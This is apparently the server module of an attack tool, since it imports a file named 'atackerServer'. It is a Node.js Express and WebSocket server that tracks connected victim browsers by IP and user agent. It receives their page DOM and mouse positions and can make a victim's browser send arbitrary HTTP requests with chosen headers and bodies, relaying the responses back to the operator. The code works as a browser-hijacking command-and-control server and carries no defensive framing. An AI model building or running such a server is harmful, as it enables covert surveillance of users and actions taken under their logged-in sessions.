const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const app = express();
const port = 8000;


const server = http.createServer(app);

const wss = new WebSocket.Server({ server });

app.use(express.static(path.join(__dirname, 'public')));

app.get('/connect', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'connection.html'));
  });

  function startListening(shve) {
    const ws = Array.from(wss.clients).find((client) => client.id === shve);
    if (ws) {
      const message = JSON.stringify({
        listening: 'on',
      });
      ws.send(message);
    } else {
      console.log(`Websocket ${shve} not found`);
    }
  }
  
  function stopListening(shve) {
    const ws = Array.from(wss.clients).find((client) => client.id === shve);
    if (ws) {
      const message = JSON.stringify({
        listening: 'off',
      });
      ws.send(message);
    } else {
      console.log(`Websocket ${shve} not found`);
    }
  }
  
  wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    ws.id = clientId;
    ws.userAgent = req.headers['user-agent'];
    ws.ip = req.socket.remoteAddress;
  
    console.log(`New client connected (ID: ${clientId})`);
  
    ws.on('close', () => {
      console.log(`Client ${ws.id} lost`);
    });
  
    ws.on('message', (message) => {
      handleMessage(ws.id, message);
    });
  });

function handleMessage(wsId, message) {
  const { writeDom, setMouse } = require('./atackerServer');
  try {
    const parsedMessage = JSON.parse(message);
    if (parsedMessage.writeDom) {
      const { data, baseURL } = parsedMessage.writeDom;
      writeDom(wsId, data, baseURL);
    } else if (parsedMessage.setMouse) {
      const { mouseX, mouseY } = parsedMessage.setMouse;
      setMouse(wsId, mouseX, mouseY);
    }
  } catch (error) {
    console.error(error);
  }
}

function getConnectedClients() {
  return Array.from(wss.clients)
    .filter(client => client.readyState === WebSocket.OPEN)
    .map(client => ({
      id: client.id,
      readyState: client.readyState,
      userAgent: client.userAgent,
      ip: client.ip,
    }));
}

function sendWebSocketRequest(wsId, method, url, headers = {}, postData = null) {
  const data = {
    method,
    url,
    headers,
  };
  if (postData) {
    data.data = postData;
  }
  const message = JSON.stringify({
    sendRequest: data,
  });

  const ws = Array.from(wss.clients).find((client) => client.id === wsId);
  if (ws) {
    return new Promise((resolve) => {
      ws.send(message);
      ws.on('message', (response) => {
        try {
          const responseData = JSON.parse(response);
          if (responseData.error) {
            resolve(responseData);
          } else {
            resolve({
              data: responseData.data,
              headers: responseData.headers,
              status_code: responseData.status_code,
            });
          }
        } catch (err) {
          resolve({ error: err.message, statusCode: -1 });
        }
      });
    });
  } else {
    console.log(`Websocket ${wsId} not found`);
    return({ error: 'Websocket ' + wsId + ' not found', statusCode: -1 });
  }
}

  

module.exports = {
  startServer: () => {
    server.listen(port, () => {
      console.log(`Server running on http://localhost:${port}`);
    });
  },
  getConnectedClients,
  sendWebSocketRequest,
  startListening,
  stopListening,
};